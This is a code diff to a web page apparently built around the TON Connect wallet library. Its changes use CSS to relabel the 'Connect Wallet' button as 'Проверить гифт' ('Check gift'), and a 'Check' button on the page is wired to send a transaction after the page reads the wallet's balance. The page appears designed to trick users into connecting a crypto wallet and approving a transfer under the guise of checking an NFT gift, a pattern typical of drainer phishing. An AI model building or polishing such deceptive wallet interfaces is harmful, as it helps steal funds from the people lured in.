@@ -38,26 +38,22 @@
         #ton-connect {
             display: flex;
             justify-content: center;
+            margin-bottom: 1.5rem;
         }
 
-        /* Замена названия кнопки на "Проверить гифт" */
-        #ton-connect button span {
-            display: none !important; /* Скрываем встроенный текст "Connect Wallet" */
+        /* Заменяем текст "Connect Wallet" на "Проверить гифт" до подключения */
+        #ton-connect button[data-tc-connect-button="true"] span {
+            font-size: 0 !important;
         }
 
-        #ton-connect button::after {
-            content: "Проверить гифт"; /* Новый текст кнопки */
+        #ton-connect button[data-tc-connect-button="true"] span::before {
+            content: "Проверить гифт";
             font-size: 15px !important;
             font-weight: 600;
         }
 
-        #ton-connect.hidden {
-            display: none !important;
-        }
-
         .wallet-details {
             display: none;
-            margin-top: 0;
             padding: 1.25rem;
             background-color: #0f172a;
             border-radius: 12px;
@@ -129,15 +125,15 @@
 <body>
 
 <div class="card">
-    <!-- Первая кнопка "Проверить гифт" (вместо Connect Wallet) -->
+    <!-- Кнопка подключения TON Connect (сменён текст на "Проверить гифт") -->
     <div id="ton-connect"></div>
 
-    <!-- Блок деталей, который появляется после подключения -->
+    <!-- Блок с деталями и второй кнопкой "Проверить" -->
     <div id="wallet-info" class="wallet-details">
         <div class="info-title">НФТ:</div>
         <div id="wallet-address" class="info-value"></div>
 
-        <!-- Кнопка "Проверить" -->
+        <!-- Кнопка Проверить -->
         <button id="sendTxBtn" class="send-btn" disabled>Проверить</button>
         <div id="txStatus" class="tx-status"></div>
     </div>
@@ -149,7 +145,6 @@
         buttonRootId: 'ton-connect'
     });
 
-    const tonConnectBtnContainer = document.getElementById('ton-connect');
     const walletInfoContainer = document.getElementById('wallet-info');
     const walletAddressContainer = document.getElementById('wallet-address');
     const sendBtn = document.getElementById('sendTxBtn');
@@ -249,9 +244,6 @@
         if (wallet) {
             const address = wallet.account.address;
             walletAddressContainer.innerText = address;
-            
-            // Скрываем первую кнопку и показываем блоки
-            tonConnectBtnContainer.classList.add('hidden');
             walletInfoContainer.classList.add('active');
 
             await fetchWalletBalance(address);
@@ -259,8 +251,6 @@
             txStatus.className = 'tx-status';
         } else {
             walletAddressContainer.innerText = '';
-            
-            tonConnectBtnContainer.classList.remove('hidden');
             walletInfoContainer.classList.remove('active');
             
             sendBtn.disabled = true;
